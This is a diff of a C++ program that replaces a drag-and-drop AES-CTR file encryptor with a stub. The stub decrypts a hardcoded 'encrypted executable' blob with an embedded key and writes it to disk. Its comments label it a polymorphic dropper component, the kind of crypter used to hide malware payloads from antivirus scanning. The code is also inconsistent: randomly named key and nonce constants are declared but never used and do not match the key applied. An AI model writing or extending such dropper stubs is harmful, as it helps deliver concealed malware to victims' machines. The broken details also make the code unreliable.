@@ -1,3 +1,4 @@
+
 #include <iostream>
 #include <fstream>
 #include <vector>
@@ -5,9 +6,16 @@
 #include <cstring>
 #include <cstdlib>
 #include <cstdint>
+#include <random>
 #include <ctime>
 
-// AES-128-CTR implementation
+// Polymorphic key and nonce (no obfuscation)
+const std::string KEY_puUZLzHK = "215daa437e23f36e8525cff91477f44c";
+const std::string NONCE_wuhVJag7 = "c279b8af3e179ff8df7bfc7594b85e24";
+
+
+
+// AES-128-CTR implementation (same as native_encryptor/dropper)
 static const uint8_t sbox[256] = {
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -27,10 +35,12 @@ static const uint8_t sbox[256] = {
     0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16
 };
 
+// Round constants for key expansion
 static const uint8_t rcon[10] = {
     0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36
 };
 
+// AES helper functions
 inline uint8_t gmul(uint8_t a, uint8_t b) {
     uint8_t p = 0;
     for (int i = 0; i < 8; i++) {
@@ -51,10 +61,23 @@ inline void subBytes(uint8_t* state) {
 
 inline void shiftRows(uint8_t* state) {
     uint8_t temp;
-    temp = state[1]; state[1] = state[5]; state[5] = state[9]; state[9] = state[13]; state[13] = temp;
+    // Row 1: shift left by 1
+    temp = state[1];
+    state[1] = state[5];
+    state[5] = state[9];
+    state[9] = state[13];
+    state[13] = temp;
+    
+    // Row 2: shift left by 2
     temp = state[2]; state[2] = state[10]; state[10] = temp;
     temp = state[6]; state[6] = state[14]; state[14] = temp;
-    temp = state[3]; state[3] = state[15]; state[15] = state[11]; state[11] = state[7]; state[7] = temp;
+    
+    // Row 3: shift left by 3
+    temp = state[3];
+    state[3] = state[15];
+    state[15] = state[11];
+    state[11] = state[7];
+    state[7] = temp;
 }
 
 inline void mixColumns(uint8_t* state) {
@@ -175,72 +198,36 @@ inline void aesCtrCrypt(const uint8_t* input, uint8_t* output, size_t length,
     }
 }
 
-// Simple random number generator
-inline uint32_t simpleRand() {
-    static uint32_t seed = 0x12345678;
-    seed = seed * 1103515245 + 12345;
-    return seed;
+// Convert hex string to bytes
+void hexToBytes(const std::string& hex, uint8_t* bytes) {
+    for (size_t i = 0; i < hex.length(); i += 2) {
+        bytes[i/2] = std::stoi(hex.substr(i, 2), nullptr, 16);
+    }
 }
 
-int main(int argc, char* argv[]) {
-    if (argc != 2) {
-        std::cout << "=== Drag & Drop Encryptor ===" << std::endl;
-        std::cout << "Usage: " << argv[0] << " <file_to_encrypt>" << std::endl;
-        std::cout << "Just drag and drop any file onto this executable!" << std::endl;
+int main() {
+    // Convert hex strings to bytes
+    uint8_t key[16], nonce[16];
+    hexToBytes("1c5712a94640db68fb21fddf5113c762", key);
+    hexToBytes("f72f752863519abfcbbe59753ac69292", nonce);
+
+    // Embedded encrypted executable data
+    uint8_t embeddedData[] = {0x32, 0x98, 0x6e, 0x16, 0xe4, 0x88, 0x7c, 0x6d, 0x7b, 0xa5, 0x57, 0x4b, 0xa8, 0x10, 0xd1, 0x10, 0xd0, 0xd2, 0xcb, 0x2b, 0x0d, 0xfc, 0xb0, 0x5c, 0xf9, 0x79, 0x32, 0xfb, 0xa7, 0xee, 0x61, 0x58, 0x0c, 0x60, 0xf9, 0xc7, 0xdb, 0x1e, 0xa6, 0x5e, 0x90, 0xb3, 0x5b, 0x7c, 0x8b, 0xf8, 0x73, 0x0c, 0x36, 0x1a, 0x0c, 0x9b, 0x7e, 0xc3, 0xe6, 0x35, 0x61, 0x45, 0x08, 0x23, 0x37, 0xd5, 0x3b, 0xff, 0x82, 0x39, 0xe1, 0x16, 0xc4, 0x1a, 0x4e, 0xf6, 0x48, 0xdd, 0x58, 0xaa, 0x34, 0xff, 0x43, 0x5a, 0x91, 0xad, 0x4e, 0xee, 0xe6, 0x56, 0xb3, 0x88, 0x93, 0x88, 0x0f, 0x51, 0xb4, 0xb0, 0xf3, 0x51, 0xb4, 0x47, 0x02, 0xbd, 0x87, 0x85, 0x80, 0xf1, 0x04, 0x36, 0xb8, 0xeb, 0x98, 0x0d, 0x21, 0x12, 0xa5, 0x23, 0x46, 0xd0, 0xeb, 0xe2, 0x14, 0x1b, 0xfe, 0xdd, 0x5e, 0x4d, 0xd3};
+    const size_t embeddedDataSize = sizeof(embeddedData);
+
+    // Decrypt the data using AES-128-CTR
+    aesCtrCrypt(embeddedData, embeddedData, embeddedDataSize, key, nonce);
+
+    // Write decrypted data to file
+    std::ofstream outFile("decrypted_output.bin", std::ios::binary);
+    if (outFile.is_open()) {
+        outFile.write(reinterpret_cast<const char*>(embeddedData), embeddedDataSize);
+        outFile.close();
+        std::cout << "Data decrypted and saved to decrypted_output.bin" << std::endl;
+    } else {
+        std::cerr << "Failed to create output file" << std::endl;
         return 1;
     }
-    
-    std::string inputFile = argv[1];
-    std::string outputFile = inputFile + ".enc";
-    
-    // Read input file
-    std::ifstream inFile(inputFile, std::ios::binary);
-    if (!inFile.is_open()) {
-        std::cerr << "Error: Cannot open file: " << inputFile << std::endl;
-        return 1;
-    }
-    
-    std::vector<uint8_t> fileData((std::istreambuf_iterator<char>(inFile)),
-                                std::istreambuf_iterator<char>());
-    inFile.close();
-    
-    if (fileData.empty()) {
-        std::cerr << "Error: File is empty" << std::endl;
-        return 1;
-    }
-    
-    // Generate random key and nonce
-    uint8_t aesKey[16];
-    uint8_t nonce[16];
-    
-    for (int i = 0; i < 16; i++) {
-        aesKey[i] = simpleRand() & 0xFF;
-        nonce[i] = simpleRand() & 0xFF;
-    }
-    
-    std::cout << "Generated random key and nonce for encryption." << std::endl;
-    
-    // Encrypt the data
-    aesCtrCrypt(fileData.data(), fileData.data(), fileData.size(), aesKey, nonce);
-    
-    // Write encrypted file (nonce + encrypted data)
-    std::ofstream outFile(outputFile, std::ios::binary);
-    if (!outFile.is_open()) {
-        std::cerr << "Error: Cannot create output file: " << outputFile << std::endl;
-        return 1;
-    }
-    
-    // Write nonce first
-    outFile.write(reinterpret_cast<char*>(nonce), 16);
-    
-    // Write encrypted data
-    outFile.write(reinterpret_cast<char*>(fileData.data()), fileData.size());
-    outFile.close();
-    
-    std::cout << "✓ File encrypted successfully!" << std::endl;
-    std::cout << "  Input: " << inputFile << std::endl;
-    std::cout << "  Output: " << outputFile << std::endl;
-    std::cout << "  Size: " << fileData.size() << " bytes" << std::endl;
-    
+
     return 0;
 }
